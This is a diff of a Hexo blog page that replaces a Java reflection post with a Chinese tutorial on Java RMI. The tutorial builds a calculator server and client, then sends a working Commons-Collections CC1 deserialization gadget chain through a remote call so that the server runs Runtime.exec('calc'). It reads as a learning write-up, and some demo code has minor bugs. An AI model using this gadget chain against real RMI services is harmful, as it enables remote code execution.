@@ -10,34 +10,26 @@
     <meta name="copyright" content="us1n9ns">
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     <meta name="description" content="">
-    <meta name="description" content="（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式  传统的RTTI，我们编写知道所有的类型·  反射机制，允许在运行时查询和操作类的信息  太抽象了举例子  正常写代码，一个类写出来  123456789101112131415161718192021222324public class showclass &#123;      St">
+    <meta name="description" content="远程方法调用结构简单分为：  客户端 客户端注册中心 服务端 服务端注册中心  调用要求首先，客户端和服务端需要用有相同的接口，不同的是服务端还需要有接口的具体实现方法，这也比较符合常识其次，接口必须要被实现后才能进行调用，客户端通过注册中心动态代理生成，负责把方法调用通过网络传递到服务端，而服务端注册中心解析客户端注册中心请求，然后服务端调用真正接口实现函数 测试demo服务端#创建接口 123">
 <meta property="og:type" content="article">
-<meta property="og:title" content="反射机制">
-<meta property="og:url" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">
+<meta property="og:title" content="RMI">
+<meta property="og:url" content="https://usingns.github.io/2025/07/20/RMI/">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式  传统的RTTI，我们编写知道所有的类型·  反射机制，允许在运行时查询和操作类的信息  太抽象了举例子  正常写代码，一个类写出来  123456789101112131415161718192021222324public class showclass &#123;      St">
+<meta property="og:description" content="远程方法调用结构简单分为：  客户端 客户端注册中心 服务端 服务端注册中心  调用要求首先，客户端和服务端需要用有相同的接口，不同的是服务端还需要有接口的具体实现方法，这也比较符合常识其次，接口必须要被实现后才能进行调用，客户端通过注册中心动态代理生成，负责把方法调用通过网络传递到服务端，而服务端注册中心解析客户端注册中心请求，然后服务端调用真正接口实现函数 测试demo服务端#创建接口 123">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/2.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/3.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/4.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/5.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/6.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/7.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/8.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/9.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/10.png">
-<meta property="og:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/11.png">
-<meta property="article:published_time" content="2025-04-03T03:07:50.000Z">
-<meta property="article:modified_time" content="2025-07-14T05:16:01.122Z">
+<meta property="og:image" content="https://usingns.github.io/2025/07/20/RMI/1.png">
+<meta property="og:image" content="https://usingns.github.io/2025/07/20/RMI/2.png">
+<meta property="og:image" content="https://usingns.github.io/2025/07/20/RMI/3.png">
+<meta property="article:published_time" content="2025-07-20T06:19:40.000Z">
+<meta property="article:modified_time" content="2025-07-20T06:20:23.764Z">
 <meta property="article:author" content="us1n9ns">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png">
+<meta name="twitter:image" content="https://usingns.github.io/2025/07/20/RMI/1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
-    <title>反射机制 · us1n9ns&#39;s Blog</title>
+    <title>RMI · us1n9ns&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -256,7 +248,7 @@
             <a href="/">us1n9ns&#39;s Blog.</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">反射机制</a>
+            <a href="#" class="post-name">RMI</a>
         </div>
     </div>
 </header>
@@ -283,7 +275,7 @@
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-                反射机制
+                RMI
             <!-- 404 -->
         </h1>
         <!-- 副标题 -->
@@ -300,12 +292,12 @@
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">746</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">953</span>Reading time: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2025/04/03</span>
+                    <span class="post-intro-time">2025/07/20</span>
                     <!-- busuanzi -->
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                             <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
@@ -457,56 +449,49 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <ul>
-<li>（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式<br>  传统的RTTI，我们编写知道所有的类型·<br>  反射机制，允许在运行时查询和操作类的信息<br>  太抽象了举例子<br>  正常写代码，一个类写出来</li>
+        <p>远程方法调用<br>结构简单分为：</p>
+<ul>
+<li>客户端</li>
+<li>客户端注册中心</li>
+<li>服务端</li>
+<li>服务端注册中心</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class showclass &#123;  </span><br><span class="line">    String classname;  </span><br><span class="line">    //默认无参方法  </span><br><span class="line">    showclass() &#123;&#125;  </span><br><span class="line">    //有参方法  </span><br><span class="line">    showclass(String classname) &#123;  </span><br><span class="line">        //初始化  </span><br><span class="line">        this.classname = classname;  </span><br><span class="line">    &#125;  </span><br><span class="line">    void show() &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:show&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    //重载方法  </span><br><span class="line">    void show(String massage) &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:&quot;+massage);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public String toString() &#123;  </span><br><span class="line">        return &quot;showclass&#123;&quot; +  </span><br><span class="line">                &quot;classname=&#x27;&quot; + classname + &#x27;\&#x27;&#x27; +  </span><br><span class="line">                &#x27;&#125;&#x27;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用（我已经知道类的信息了）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        showclass showclass = new showclass(&quot;LiMing&quot;);  </span><br><span class="line">        showclass.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png" class="">
-<p>但是你不知道，程序只能靠运行时信息来发现，自然也就没法在编码阶段直接使用new来创建对象和使用对象，但是使用反射来使用showclass类是可以的</p>
-<p>（资料）在sping中，就有反射来动态构造类和属性的使用</p>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/2.png" class="">
-<p>指定需要class，sping就会帮我们创建好并进行赋值</p>
-<p>那使用反射来进行刚才的操作：<br>获取类，创建对象，属性赋值，调用方法<br>（想写的都在注释里面）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        //外部包可以是&quot;com.xxx.showclass&quot;,这里没有所以直接使用showclass  </span><br><span class="line">        //可能会出现找不到类的错误，把它放进异常里面  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">        //我们要如何根据c信息操作呢  </span><br><span class="line">        // 所有类都是继承自Object  </span><br><span class="line">        Object obj=c.newInstance();  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/3.png" class="">
-<p>但是想要传入message有参构造就不能使用newInstance()了，而且java9之后这个方法也被废弃了，我么可以使用getConstructor()获取构造器</p>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/4.png" class="">
-<p>接收的是一堆类型是因为重载</p>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/5.png" class="">
+<h2 id="调用要求"><a href="#调用要求" class="headerlink" title="调用要求"></a>调用要求</h2><p>首先，客户端和服务端需要用有相同的接口，不同的是服务端还需要有接口的具体实现方法，这也比较符合常识<br>其次，接口必须要被实现后才能进行调用，客户端通过注册中心动态代理生成，负责把方法调用通过网络传递到服务端，而服务端注册中心解析客户端注册中心请求，然后服务端调用真正接口实现函数</p>
+<h2 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>#创建接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">import junit.framework.Test;</span><br><span class="line"></span><br><span class="line">import junit.framework.TestCase;</span><br><span class="line"></span><br><span class="line">import junit.framework.TestSuite;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public interface Calc extends Remote &#123;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    public int add(int a,int b);</span><br><span class="line"></span><br><span class="line">    public void print(Object o);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/6.png" class="">
-<p>这种情况下会报错，说找不到方法，因为前面属性定义问题，如果换成public就可以了，但更改不是咱们说了算的，所以使用getgetDeclaredConstructor()方法获取所有的构造器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行成功<br>想要修改一个类中的属性</p>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/7.png" class="">
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/8.png" class="">
+<p>把这部分都放进客户端项目和服务端项目，也就意味着拥有了相同的接口<br>#详细在服务端写是实现类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Calcmpl implements Calc&#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public int add(int a ,int b)&#123;</span><br><span class="line"></span><br><span class="line">        int resule = a+b;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;%d+%d = %d\n&quot;,a,b,resule );</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public void print(Object o)&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(0);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        Field f=c.getDeclaredField(&quot;classname&quot;);  </span><br><span class="line">        f.setAccessible(true);  </span><br><span class="line">        f.set(o,&quot;Denny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过对属性权限的修改，然后修改属性的value<br>同样的如果想要获取方法，使用getMethods()获得public级别的方法，使用getDeclaredMethods()获取所有权限的方法</p>
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/9.png" class="">
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/10.png" class="">
-<img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/11.png" class="">
+<p>#主程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line">import java.rmi.*;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry; </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">public class RMIServer &#123; public static void main(String[] args) throws RemoteException &#123; Registry registry = LocateRegistry.createRegistry(6543); </span><br><span class="line">Calc calc = new Calcmpl(); </span><br><span class="line">//把实现类绑定到注册中心</span><br><span class="line">registry.rebind(&quot;calc&quot;, UnicastRemoteObject.exportObject(calc, 0)); &#125; &#125;</span><br></pre></td></tr></table></figure>
 
-<p>如果方法为私有，也可以同样的设置setAccessible(ture)来进行修改</p>
-<p>以上为java反射机制的基础知识</p>
-<hr>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.*;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws RemoteException ,NotBoundException&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,6543);</span><br><span class="line"></span><br><span class="line">        Calc calc = (Calc)registry.lookup(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        int result =calc.add(1,2);</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到结果</p>
+<img src="/2025/07/20/RMI/1.png" class="">
+
+<img src="/2025/07/20/RMI/2.png" class="">
+<p>发现是在RMIServer上面运行的函数<br>在RMIClient上面接收的结果</p>
+<h2 id="如何调用"><a href="#如何调用" class="headerlink" title="如何调用"></a>如何调用</h2><p>使用RMIClient这边去打RMIServer注册中心这边<br>具体怎么操作呢<br>可以试试使用前几篇文章中提到的cc1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    public void test2() throws Exception &#123;  </span><br><span class="line">/*        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(                &quot;exec&quot;,                new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;calc&quot;&#125;        );*/  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">        CCTest.serialize(o);  </span><br><span class="line">        CCTest.unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>修改下传入为对象cc1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import service.Calc;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">import  org.apache.commons.collections.Transformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">public class RMIClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,9000);  </span><br><span class="line">        Calc calc = (Calc)registry.lookup(&quot;calc&quot;);  </span><br><span class="line">        calc.print(cc1());  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static Object cc1() throws RemoteException, NotBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">        Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(true);  </span><br><span class="line">        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);  </span><br><span class="line">        return o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弹出计算器</p>
+<img src="/2025/07/20/RMI/3.png" class="">
 
     </article>
     <!-- license -->
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2025/07/14/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C%E9%9A%8F%E7%AC%94/" title="上海交通大学生存手册随笔">
-                    <div class="nextTitle">上海交通大学生存手册随笔</div>
-                </a>
         </li>
         <li class="previous">
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2025/03/31/%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/" title="关于个人博客的搭建">
-                    <div class="prevTitle">关于个人博客的搭建</div>
+                <a href="/2025/07/17/CC1%E9%93%BE/" title="CC1链">
+                    <div class="prevTitle">CC1链</div>
                 </a>
         </li>
     </ul>
@@ -562,7 +547,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E8%A6%81%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">调用要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95demo"><span class="toc-number">2.</span> <span class="toc-text">测试demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.1.</span> <span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">如何调用</span></a></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
